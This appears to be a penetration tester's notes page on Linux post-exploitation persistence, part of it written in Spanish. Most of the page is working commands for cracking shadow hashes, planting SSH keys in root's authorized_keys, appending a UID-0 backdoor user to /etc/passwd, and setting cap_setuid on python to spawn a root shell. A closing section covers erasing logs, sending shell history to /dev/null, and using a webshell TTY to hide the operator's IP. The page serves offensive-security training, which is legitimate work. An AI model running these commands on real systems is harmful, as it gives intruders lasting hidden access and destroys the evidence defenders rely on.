# Persistence

{% embed url="https://github.com/huntergregal/mimipenguin" %}

{% embed url="https://hackmag.com/security/linux-killchain/" %}

## Crack shadow hash

```bash
# HASHCAT 
hashcat.exe -m 1800 -a 0 -o cracked.txt hash.txt rockyou.txt // sha512
-----
# SOMETIMES IT'S NECESSARY --format=sha512crypt
john $HASH_FILE --wordlist=$WORDLIST --format=$HASH_FORMAT
unshadow passwd shadow > crack.txt
john crack.txt
john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
```

## SSH Authorized Keys

We can create or append more keys to **authorized\_keys**, by writing our public key to `~/.ssh/authorized_keys` to obtain persistent SSH access.&#x20;

If a user's public key is authorized, we can log in as that user directly (ssh user@localhost)&#x20;

{% code overflow="wrap" %}
```shell
https://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet
https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54

# Ed25519 - generate our SSH key pair with a strong passphrase
ssh-keygen -o -a 100 -t ed25519 -f ~/.ssh/id_ed25519 -C "kali@localhost" 
# Copy public key, rename it as authorized_keys and upload it to the target so we can authenticate it
cp ~/.ssh/id_ed25519.pub authorized_keys
# Very important to set these permissions on the target
chmod 700 .ssh/
chmod 600 authorized_keys

# Generate private key to log in via SSH 
ssh-keygen -f /root/.ssh/id_rsa -P ""
cp /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys 
cat /root/.ssh/id_rsa

# Input our public key to authorized_keys
cd /home/user && mkdir .ssh 
echo -n 'ssh-rsa AAAAB3NzaC1yc2E<SNIP>' > .ssh/authorized_keys

mkdir /root/.ssh 2>/dev/null; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChKCUsFVWj1Nz8SiM01Zw/BOWcMNs2Zwz3MdT7leLU9/Un4mZ7vjco0ctsyh2swjphWr5WZG28BN90+tkyj3su23UzrlgEu3SaOjVgxhkx/Pnbvuua9Qs9gWbWyRxexaC1eDb0pKXHH2Msx+GlyjfDOngq8tR6tkU8u1S4lXKLejaptiz0q6P0CcR6hD42IYkqyuWTNrFdSGLtiPCBDZMZ/5g1cJsyR59n54IpV0b2muE3F7+NPQmLx57IxoPjYPNUbC6RPh/Saf7o/552iOcmVCdLQDR/9I+jdZIgrOpstqSiJooU9+JImlUtAkFxZ9SHvtRbFt47iH7Sh7LiefP5 root@kali' >> /root/.ssh/authorized_keys
```
{% endcode %}

## Backdoor user - passwd

{% code overflow="wrap" %}
```bash
$ openssl passwd hola1234
D2JSqaxOMVCkY
$ echo 'hacker:D2JSqaxOMVCkY:0:0:root:/root:/bin/bash' >> /etc/passwd

# When hashed salted password is needed
$ openssl passwd -6 -salt hacker hola1234 # hacker is the salt and hola1234 the password
$6$hacker$Tz9Wzszl4b1ovGPzZO4uKDpw1tSKz2j5aZPaDhevpr3qDFmGPYYWxp0F8A2r80/1lrZ7zGbyh7uFvAOgPQcBx.
```
{% endcode %}

## SSH Backdoor

[https://github.com/NinjaJc01/ssh-backdoor](https://github.com/NinjaJc01/ssh-backdoor)

## Capabilities

| [https://man7.org/linux/man-pages/man7/capabilities.7.html](https://man7.org/linux/man-pages/man7/capabilities.7.html)                                                                                                   |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [https://www.incibe-cert.es/blog/linux-capabilities](https://www.incibe-cert.es/blog/linux-capabilities)                                                                                                                 |
| [https://gtfobins.github.io/#+capabilities](https://gtfobins.github.io/#+capabilities)                                                                                                                                   |
| [https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc](https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc) |

```bash
# For example, once we are root we can set a capability for Python3.5
whereis python
setcap cap_setuid+ep /usr/bin/python3.5
# We can check it's properly set with setcap.
# After this, we can spawn a shell from a non-privileged account:
/usr/bin/python3.5 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# visit GTFOBins and check capabilities
```

## **Covering our tracks**

The final stages of penetration testing involve setting up persistence and covering our tracks.&#x20;

During a pentesting engagement, you will want to try to avoid detection from the administrators & engineers of your client wherever within the permitted scope of the pentesting engagement. Activities such as logging in, authentication and uploading/downloading files are logged by services and the system itself.

On Debian and Ubuntu, the majority of these are left within the "/var/log directory and often require administrative privileges to read and modify. Some log files of interest:

* "/var/log/auth.log" (Attempted logins for SSH, changes too or logging in as system users:)

![](<../../.gitbook/assets/image (66).png>)

* "/var/log/syslog" (System events such as firewall alerts:)

![](<../../.gitbook/assets/image (35).png>)

* "/var/log/\<service/"
* For example, the access logs of apache2
  * /var/log/apache2/access.log"

![](<../../.gitbook/assets/image (68).png>)

Si han sido consultas HTTP en su mayoría, una vez siendo root tal vez habría aprovechado para borrar las últimas entradas del **/var/log/apache2/access.log** (en caso de que sea Apache, por ejemplo), habría inspeccionado bien los exploits para ver qué tipo de ficheros temporales alojan sobre el sistema, para también borrarlos, habría borrado las últimas líneas del histórico de comandos del usuario root, o hecho un **'ln -s -f /dev/null .zsh\_history'** para aprovechar y no tener que preocuparme de futuros movimientos, y tal vez habría investigado un poco a fondo sobre qué logs aloja Drupal a nivel de sistema para borrar las últimas entradas. Lo que respecta a temas de conexiones TCP, para evitar dejar rastros y que figure mi dirección IP, suelo tirar de un recurso que compartí hace poco por GitHub: [https://github.com/s4vitar/ttyoverhttp](https://www.youtube.com/redirect?event=comments\&redir_token=QUFFLUhqblRpYXIwWlR1VzZ1N1FRczNuLTlwU2l4TXNJQXxBQ3Jtc0trdkRZS0FEY1FsSm1sSm1lODFQVVlzOXZYaEQ1T252X2lGaUhBd2doMWlpdmZiRktvdU5PeU8tZXJ2dDBtaVlWMUFraF9YWXhBX3FaWmxVR2FiZ21sV1NCaUNwS3FXRV9NZnZmSGlHZ1p4Si1Gc1I4Zw\&q=https%3A%2F%2Fgithub.com%2Fs4vitar%2Fttyoverhttp\&stanza_id=Ugy8uNpc2P2HldD4uY54AaABAg.93Sz-woSTrA93T-hZi-0-Z), donde básicamente gestionamos mediante el uso de una "webshell", una TTY completamente interactiva haciendo uso de la utilidad mkfifo para no tener que tirar de Reverse Shells. La consola sería completamente funcional y con capacidad de modo interactivo (mysql, migración de usuarios, etc.), no teniendo que especificar jamás tu dirección IP (figuraría por ejemplo a nivel de logs de apache por tus consultas pero a nivel de netstat no habría ningún Socket establecido).
